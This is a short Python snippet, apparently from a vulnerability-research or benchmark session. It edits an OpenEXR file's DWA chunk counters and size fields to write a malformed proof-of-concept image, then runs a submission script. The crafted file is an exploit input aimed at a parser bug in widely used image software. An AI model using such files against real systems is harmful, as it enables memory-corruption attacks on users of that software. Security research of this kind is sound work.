# parse header end
pos=8
while data[pos]!=0:

    te=data.index(0,pos); pos=te+1
    sz=struct.unpack_from('<I',data,pos)[0]; pos += 4+sz
pos+=1
chunk_off=struct.unpack_from('<Q',data,pos)[0]
chunk_data=chunk_off+8
counters=list(struct.unpack_from('<'+'Q'*11,data,chunk_data))
orig=counters[:]
counters[5]=1
struct.pack_into('<'+'Q'*11,data,chunk_data,*counters)
newsize=88+counters[1+1]+counters[3]+counters[4]+counters[5] # wrong unknownCompressed counters[2]
newsize=88+counters[2]+counters[3]+counters[4]+counters[5]
struct.pack_into('<I', data, chunk_off+4, newsize)
out=Path('/workspace/poc_dwa_rle_chunkshort.exr')
out.write_bytes(data)
print('orig counters',orig,'new',counters,'newsize',newsize,'leader',struct.unpack_from('<iI',data,chunk_off))
# submit with same analysis
res=subprocess.run(['bash','/workspace/submit.sh',str(out),'/workspace/analysis.json'],cwd='/workspace',stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,timeout=240)
print('RC',res.returncode)
print(res.stdout)
